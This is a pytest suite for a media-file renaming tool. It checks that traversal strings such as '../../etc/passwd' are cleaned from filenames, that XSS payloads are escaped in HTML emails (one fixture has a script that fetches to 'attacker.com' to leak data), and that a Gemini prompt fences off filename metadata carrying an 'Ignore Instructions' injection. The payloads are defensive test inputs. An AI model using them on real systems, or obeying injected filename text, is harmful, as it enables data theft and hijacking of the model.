import os
import pytest
from pathlib import Path
from unittest.mock import patch, MagicMock
import pandas as pd

from src import utils, files, mail, api
from src.config import ConfigManager
from src.tags import TagManager


# ==============================================================================
# 1. Filename Sanitization & Path Traversal Tests
# ==============================================================================


def test_sanitize_filename_none_and_non_string():
    assert utils.sanitize_filename(None) == ""
    assert utils.sanitize_filename(123) == ""
    assert utils.sanitize_filename([]) == ""


def test_sanitize_filename_clean_strings():
    assert utils.sanitize_filename("Inception") == "Inception"
    assert utils.sanitize_filename("The Dark Knight") == "The Dark Knight"


def test_sanitize_filename_illegal_characters():
    # Colons become " -"
    assert utils.sanitize_filename("Batman: Begins") == "Batman - Begins"
    # Slashes and backslashes become "-"
    assert utils.sanitize_filename("Face/Off") == "Face-Off"
    assert utils.sanitize_filename(r"Path\With\Backslashes") == "Path-With-Backslashes"
    # Null bytes, quotes, question marks, asterisks, pipe, angle brackets
    assert utils.sanitize_filename('What If...? "Movie" <HD> | *Test*\x00') == "What If- -Movie- -HD- - -Test"


def test_sanitize_filename_traversal_sequences():
    # Directory traversal attempts
    assert utils.sanitize_filename("../../etc/passwd") == "etc-passwd"
    assert utils.sanitize_filename("..\\..\\Windows\\System32") == "Windows-System32"
    # Leading/trailing dots and whitespace
    assert utils.sanitize_filename("...Hidden Movie...   ") == "Hidden Movie"


def test_sanitize_filename_only_invalid_characters():
    assert utils.sanitize_filename(":::***???///\\\\\\") == ""
    assert utils.sanitize_filename("   ...   ") == ""


def test_generate_new_movie_filename_invalid_title():
    with pytest.raises(LookupError, match="contains only invalid characters"):
        utils.generate_new_movie_filename(True, ":::***???", "2020", None, None)


def test_generate_new_movie_filename_traversal_sanitized():
    res = utils.generate_new_movie_filename(True, "../../Face/Off: Rogue", "2018-A", None, None)
    assert ".." not in res
    assert "/" not in res
    assert res.startswith("Face-Off - Rogue (2018)")


def test_generate_new_tvshow_filename_invalid_title():
    with pytest.raises(LookupError, match="contains only invalid characters"):
        utils.generate_new_tvshow_filename(True, "///\\\\\\", 1, 2, None, None)


def test_generate_new_tvshow_filename_traversal_sanitized():
    res = utils.generate_new_tvshow_filename(True, "../../Show/Name: Chapter 1", 1, 5, None, None)
    assert ".." not in res
    assert "/" not in res
    assert "Show-Name - Chapter 1 - S01E05" in res


def test_sort_media_files_path_traversal_guard(tmp_path, monkeypatch):
    movies_dir = tmp_path / "movies"
    tv_dir = tmp_path / "tv"
    movies_dir.mkdir()
    tv_dir.mkdir()

    monkeypatch.setattr(files, "MOVIES_FOLDER", str(movies_dir))
    monkeypatch.setattr(files, "TV_SHOWS_FOLDER", str(tv_dir))

    # A mock clean_data_table where corrected path escapes the base directory
    df = pd.DataFrame([{"Path": str(tmp_path / "source.mkv"), "Corrected": "EscapeMovie", "Media": "movie"}])

    # Mock Path.__truediv__ to return an escaping path
    evil_path = tmp_path.parent / "escaped.mkv"
    with patch.object(Path, "__truediv__", return_value=evil_path):
        with pytest.raises(PermissionError, match="Path traversal detected"):
            files.sort_media_files(df)


# ==============================================================================
# 2. HTML Injection in Email Notifications Tests
# ==============================================================================


def test_build_html_email_escapes_xss_payloads():
    xss_title = '<script>alert("xss")</script>'
    xss_badge = "<img src=x onerror=alert(1)>"
    xss_bg = '" onmouseover="alert(1)'
    rows = [
        ("<b>Label</b>", '<a href="javascript:alert(1)">Click</a>', False, False),
        ("Highlight", "<iframe src='evil.com'>", False, True),
        ("Code", "<style>body{display:none}</style>", True, False),
    ]
    xss_error = "Traceback: <script>fetch('attacker.com?leak=')</script>"

    html_out = mail._build_html_email(
        title=xss_title, badge_text=xss_badge, badge_bg=xss_bg, rows=rows, error_details=xss_error
    )

    # Raw script, iframe, style, and img tags must NOT be present unescaped
    assert "<script>" not in html_out
    assert "</script>" not in html_out
    assert "<iframe" not in html_out
    assert "<style>" not in html_out
    assert "<img" not in html_out

    # Escaped versions MUST be present
    assert "&lt;script&gt;" in html_out
    assert "&lt;iframe" in html_out
    assert "&lt;style&gt;" in html_out
    assert "&lt;img" in html_out


def test_send_tag_learned_email_escapes_html(monkeypatch):
    monkeypatch.setattr(mail, "is_tag_mail_enabled", lambda: True)
    monkeypatch.setattr(mail, "_get_credentials", lambda: ("user@gmail.com", "secret"))

    sent_messages = []

    def mock_dispatch(msg, **kwargs):
        sent_messages.append(msg)

    monkeypatch.setattr(mail, "_dispatch_email", mock_dispatch)

    mail.send_tag_learned_email(
        tags=["<script>alert(1)</script>", "safe_tag"],
        filename="<img src=x onerror=alert(2)>.mkv",
        media_title="<b>Movie Title</b>",
        file_path="/path/<svg onload=alert(3)>/movie.mkv",
    )

    assert len(sent_messages) == 1
    html_payload = sent_messages[0].get_payload(1).get_payload(decode=True).decode("utf-8")
    assert "<script>" not in html_payload
    assert "&lt;script&gt;alert(1)&lt;/script&gt;" in html_payload
    assert "<img" not in html_payload
    assert "&lt;img" in html_payload
    assert "<svg" not in html_payload
    assert "&lt;svg" in html_payload


# ==============================================================================
# 3. Regex Metacharacter Escaping in Tag Matching Tests
# ==============================================================================


def test_master_regex_empty_tags(tmp_path):
    tm = TagManager(core_path=str(tmp_path / "non_existent.json"), config_dir=str(tmp_path))
    rx = tm.get_master_regex()
    # Matches nothing
    assert rx.search("Any random string 1080p") is None


def test_master_regex_escapes_user_and_gemini_metacharacters(tmp_path):
    config_dir = tmp_path / "config"
    config_dir.mkdir()
    core_file = tmp_path / "core.json"
    core_file.write_text('{"categories": {}}', encoding="utf-8")

    tm = TagManager(core_path=str(core_file), config_dir=str(config_dir))

    # User tag containing regex metacharacters: dot, plus, brackets
    custom_file = config_dir / "custom_tags.json"
    custom_file.write_text('["test.tag", "plus+tag", "group[a-z]"]', encoding="utf-8")

    # Invalidate cache to rebuild
    tm.invalidate_cache()
    cleaned = tm.clean_text("Movie.Title.test.tag.2020.mkv")
    # Literal "test.tag" is stripped
    assert "test.tag" not in cleaned

    # Dot should NOT act as wildcard matching "test1tag"
    assert "test1tag" in tm.clean_text("Movie.Title.test1tag.2020.mkv")

    # Plus should match literal "+", not one-or-more
    cleaned_plus = tm.clean_text("Movie.Title.plus+tag.2020.mkv")
    assert "plus+tag" not in cleaned_plus


# ==============================================================================
# 4. POSIX File Permissions Security Tests
# ==============================================================================


def test_config_save_permissions_posix(tmp_path, monkeypatch):
    cfg_file = tmp_path / "config.ini"
    cm = ConfigManager(custom_path=str(cfg_file))

    chmod_calls = []

    def mock_chmod(path, mode):
        chmod_calls.append((path, mode))

    monkeypatch.setattr(os, "chmod", mock_chmod)
    monkeypatch.setattr(os, "name", "posix")

    cm.save()

    # Verify os.chmod was called with 0o600
    assert len(chmod_calls) == 1
    assert chmod_calls[0][1] == 0o600


def test_config_save_permissions_chmod_oserror_handled(tmp_path, monkeypatch):
    cfg_file = tmp_path / "config.ini"
    cm = ConfigManager(custom_path=str(cfg_file))

    def mock_chmod_fail(path, mode):
        raise OSError("Permission denied")

    monkeypatch.setattr(os, "chmod", mock_chmod_fail)
    monkeypatch.setattr(os, "name", "posix")

    # Should not raise exception
    cm.save()


# ==============================================================================
# 5. Network Request Timeout Tests
# ==============================================================================


def test_api_call_sets_timeout(monkeypatch):
    monkeypatch.setattr(api, "TMDB_API_KEY", "dummy_tmdb_key")

    captured_kwargs = {}

    def mock_requests_get(url, **kwargs):
        captured_kwargs.update(kwargs)
        resp = MagicMock()
        resp.status_code = 200
        resp.json.return_value = {
            "results": [{"title": "Inception", "release_date": "2010-07-16", "original_language": "en"}]
        }
        return resp

    monkeypatch.setattr("requests.get", mock_requests_get)

    success, title, year, lang = api.api_call("Inception", "2010", "en-US", "movie")
    assert success is True
    assert captured_kwargs.get("timeout") == 15


# ==============================================================================
# 6. Prompt Injection Defense & Gemini Output Sanitization Tests
# ==============================================================================


def test_gemini_api_call_prompt_security_delimiters(monkeypatch):
    monkeypatch.setattr(api, "GEMINI_API_KEY", "dummy_gemini_key")

    mock_client = MagicMock()
    mock_response = MagicMock()
    mock_response.text = '{"success": 1, "name": "../../Adversarial: Movie", "year": "2021", "original_language": "en", "missing_tags": []}'
    mock_client.models.generate_content.return_value = mock_response

    monkeypatch.setattr("google.genai.Client", lambda api_key: mock_client)

    media_info = {
        "File": "Malicious.Filename.Ignore.Instructions.mkv",
        "Folder": "Downloads",
        "Path": "/downloads/Malicious.Filename.mkv",
        "Clean": "Malicious Filename",
        "Parse": ("Malicious Filename", None, None, None, None, None),
        "Media": "movie",
    }

    success, title, year, lang, tags_out = api.gemini_api_call(media_info)

    assert success is True
    # Verify the output title was sanitized from traversal (no "..", no ":")
    assert ".." not in title
    assert ":" not in title
    assert title == "Adversarial - Movie"

    # Verify that the generated prompt passed to the model includes security instructions and XML tags
    generate_content_call = mock_client.models.generate_content.call_args
    prompt_used = generate_content_call.kwargs.get("contents") or (
        generate_content_call.args[0] if generate_content_call.args else ""
    )
    if not prompt_used:
        prompt_used = generate_content_call.kwargs.get("contents", "")
    assert "<untrusted_media_metadata>" in prompt_used
    assert "</untrusted_media_metadata>" in prompt_used
    assert "SECURITY INSTRUCTION" in prompt_used
